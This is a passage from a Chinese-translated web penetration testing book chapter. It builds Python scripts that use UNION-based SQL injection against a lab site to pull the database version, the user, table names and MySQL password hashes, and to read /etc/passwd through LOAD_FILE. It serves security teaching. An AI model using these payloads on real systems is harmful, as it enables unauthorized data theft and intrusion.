![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00075.jpeg)

因此，我们知道了用于识别无效列名的错误消息。

现在，让我们在命令行中运行脚本。我们将切换到`SQLinjection-1.py`并运行它：

```py
python SQLinjector-1.py -w "http://www.scruffybank.com/users.php?id=FUZZ&Submit=Submit#" -i injections.txt
```

我们可以看到我们得到了与之前相同的结果，加上列的数量：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00076.jpeg)

在这种情况下，列的数量是`2`，找到的一些列名是`name`、`passwd`、`id`和`role`。

恭喜！你已经创建了一个 SQL 注入检测器。

# 利用 SQL 注入提取数据

在这一部分，我们将学习如何利用 SQL 注入以及如何在 Python 中进行交替。我们将学习可以使用 SQL 注入提取哪些类型的数据，然后我们将交替一些这些技术，比如在上一节中的 SQL 注入器脚本中自动化基本数据提取。

# 我们可以用 SQLi 提取哪些数据？

一旦我们确定了一个有效的 SQL 注入，就是时候决定我们要寻找什么了。在这里，我们有一个最典型的事物列表：

+   **基本数据**：例如，数据库版本、运行数据库的用户、当前数据库、数据库目录等等

+   **高级数据**：MySQL 用户名和密码、数据库、表名、列名以及表中的内容

+   **操作系统文件**：只要运行数据库的用户有权限，我们可以读取文件系统中的任何文件

这些是一些最有用和通常提取的数据。我鼓励你继续学习一旦你有一个可用的 SQL 注入后可以做的其他事情。

一个很好的起点是 pentestmonkey 的 Cheat Sheet ([`pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet`](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet))。

# 自动化基本提取

在我们获得一个可用的 SQL 注入后，我们想要获取的第一件事是关于我们正在使用的数据库的信息，比如数据库版本、当前用户、当前数据库等等。

为了做到这一点，我们需要使用`SELECT @@ version;`。我们将获得数据库版本。`SELECT user();`将获得运行数据库的用户。对于我们的示例，我们必须使用以下注入来获取版本；`'union SELECT1, @@version;-- -`。我们需要在`@@version`之前加上`1`，以匹配查询中受 SQL 注入影响的列数，这是受 SQL 注入影响的列数。

在我们的情况下，有两列；这就是为什么我们添加`1`。

让我们去我们的编辑器，并继续处理文件`SQLinjector-2.py`。我们添加了两个新函数，以便从数据库中获取版本和当前用户。您会注意到我们有以下注入：

```py
def detect_user(url):
  new_url= url.replace("FUZZ","""\'%20union%20SELECT%201,CONCAT('TOK',user(),
 'TOK')--%20-""")
  req=requests.get(new_url)
  raw = req.content
  reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
  users=re.findall(reg,req.content)
  for user in users:
    print user
  return user

def detect_version(url):
  new_url= url.replace("FUZZ","\'%20union%20SELECT%201,CONCAT('TOK',@@version,'TOK')--%20-")
  req=requests.get(new_url)
  raw = req.content
  reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
  version=re.findall(reg,req.content)
  for ver in version:
    print ver
  return ver
```

`%20`是空格字符的 URL 编码版本。我们正在使用`CONCAT`命令将字符串连接到结果的开头和结尾。这些字符串将作为标记，用于识别 HTML 结果中的查询输出。现在，我们将看到提取版本所需的代码。

我们通过使用正则表达式处理结果来做到这一点，以识别标记并提取它们之间找到的字符串。我们定义正则表达式，然后使用`re`库的`findall`函数与请求响应的内容一起使用，并遍历结果。

在这种情况下，应该只有一个。我们将使用`@@version`而不是`user`来获得数据库版本。

现在，我们想要获取 MySQL 用户名和密码哈希。我们需要的查询是`SELECT user, password from mysql.user;`。

请记住，只有当连接到数据库的用户具有访问表的权限时，此方法才有效。最佳实践建议游戏阶段，但仍有许多人这样做。

我们添加了函数`steal_users`来提取这些数据。我们将使用与以前相同的技术，以便在 HTML 结果中识别输出的标记。让我们在命令行中运行它并查看输出。我们将使用与以前相同的命令行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00077.jpeg)

现在，我们可以看到提取的新数据。数据库版本已打印。在这种情况下，它是`5.6.28`。它还为我们提供了有关操作系统的提示；`Ubuntu 15.10.1`。运行数据库的用户是 root，这意味着我们有高权限，可以做更有趣的事情，比如访问存储用户名和密码哈希的表`MySQL.user`。

我们可以看到用户`root`、`debian-sys-maint`和`phpmyadmin`的哈希值。重复发生是因为与每个用户关联的不同主机条目。如果需要，这些密码哈希可以使用 John the ripper 等工具破解。很好。你对目标有了一个很好的想法，所以让我们继续提取数据。

# 高级 SQLi 利用

在这一部分，我们将添加一个函数，以读取数据库中的所有表名，并将添加一个函数，以从数据库服务器操作系统中读取文件。

首先，我们将看到如何获取数据库中的所有表名，以便查看是否有感兴趣的内容，然后我们将添加从操作系统文件系统中获取决赛的能力。

现在，让我们打开文件`SQLinjector-3.py`。我们在这里添加了一个新函数，它将帮助我们获取不同模式中的表名，除了我们正在过滤以减少输出中的噪音的那些：

```py
def detect_table_names(url):
  new_url= url.replace("FUZZ","""\'%20union%20SELECT%20CONCAT('TOK',
  table_schema,'TOK'),CONCAT('TOK',table_name,'TOK')%20FROM
  %20information_schema.tables%20WHERE%20table_schema%20!=%20
  %27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27
  %20and%20table_schema%20!=%20%27performance_schema%27%20--%20-""")
  req=requests.get(new_url)
  raw = req.content
  reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
  tables=re.findall(reg,req.content)
  for table in tables:
    print table
```

结构与以前相同；我们有需要的查询，用于帮助传递结果和用于传递结果的正则表达式，然后我们打印结果。最后，在`launcher`中进行函数调用。让我们在命令行中再次运行它。

从命令行中，让我们使用与以前相同的参数运行它，使用`SQLinjector-3.py`和相同的参数：

```py
python SQLinjector-3.py -w "http://www.scruffybank.com/users.php?id=FUZZ&Submit=Submit#" -i injections.txt
```

很好，现在您可以在输出中看到我们获得了模式名称和表名称：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00078.jpeg)

在这种情况下，`pyweb`和`phpmyadmin`是模式，其他的是表`user`等等。

让我们继续到最后一个例子。让我们转到编辑器并打开文件`SQLinjection-4.py`。这非常酷，它为攻击者打开了一个新的机会。让我们看看新函数`read_file`：

```py
def read_file(url, filename):
  new_url= url.replace("FUZZ","""A\'%20union%20SELECT%201,CONCAT('TOK',
 LOAD_FILE(\'"+filename+"\'),'TOK')--%20-""")
  req=requests.get(new_url)
  reg = ur"TOK(.+?)TOK+?"
  files= re.findall(reg,req.content)
  print req.content
  for x in files:
    if not x.find('TOK,'):
      print x
```

我们将使用来自前面代码的查询来读取文件。基本上，这里的新东西是使用`LOAD_FILE`函数。

我们可以使用这个函数，正如其名称所示，它将加载一个文件，并且我们将把内容放在我们在查询中选择的列中。我们将与 union 一起使用它。然后，在`launcher`中，我们需要调用这个函数并传入我们想要读取的文件。在这个例子中，我们使用`filename="/etc/passwd"`：

```py
  filename="/etc/passwd"
  message = "\n[+] Reading file: " + filename
  print colored(message,'green')
  print "---------------------------------"
  read_file(url,filename)
```

这个文件包含了 Linux 操作系统的用户。让我们在命令行中运行它。使用与之前相同的命令行，只是将文件名更改为`SQLinjector-4.py`。然后，哇，我们就得到了确切密码文件的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00079.jpeg)

现在，我们可以更多地了解这个系统。让我们花点时间思考一下，通过滥用一个简单的编程错误，我们已经取得了什么成就；我们正在从数据库和操作系统中获取大量信息 - 而这只是个开始。

我建议玩弄这个直到你对这些技术感到舒适。如果有什么不对劲，回顾一下你的 SQL 语法。在开始阶段犯错误是非常常见的。

# 总结

在本章中，我们学习了如何通过 SQL 注入枚举数据库中的表名，并且还学会了如何通过 SQL 注入从操作系统文件系统中读取文件。

记得查看工具，比如 SQL map 或 SQL brute，以了解更多关于这些工具如何工作的信息。

在第七章，*拦截 HTTP 请求*，我们将学习关于 HTTP 代理的知识，并且我们将基于 mitmproxy 工具创建我们自己的 HTTP 代理。
